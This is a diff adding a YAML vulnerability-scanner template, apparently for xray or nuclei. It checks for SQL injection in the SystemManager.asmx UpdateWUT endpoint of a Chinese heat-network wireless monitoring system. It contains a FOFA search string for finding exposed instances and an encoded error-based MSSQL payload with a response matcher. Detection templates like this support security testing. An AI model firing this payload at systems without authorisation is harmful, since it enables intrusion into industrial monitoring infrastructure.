@@ -1,0 +1,20 @@
+id: poc-yaml-rewang-wuxian-jiance-system-systemmanager-asmx-sqli
+info:
+  name: 热网无线监测系统 SystemManager.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 热网无线监测系统
+  fofa: body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /DataSrvs/SystemManager.asmx/UpdateWUT
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: id=%28SELECT+CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28CASE+WHEN+%281675%3D1675%29+THEN+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29&name=&desc=
+  expression: "status_code == 500 && \ncontains(body,\"在将 nvarchar 值 \") &&\ncontains(body,\"\
+    转换成数据类型 int 时失败\") &&\ncontains(body,t2)\n"
+transport: http
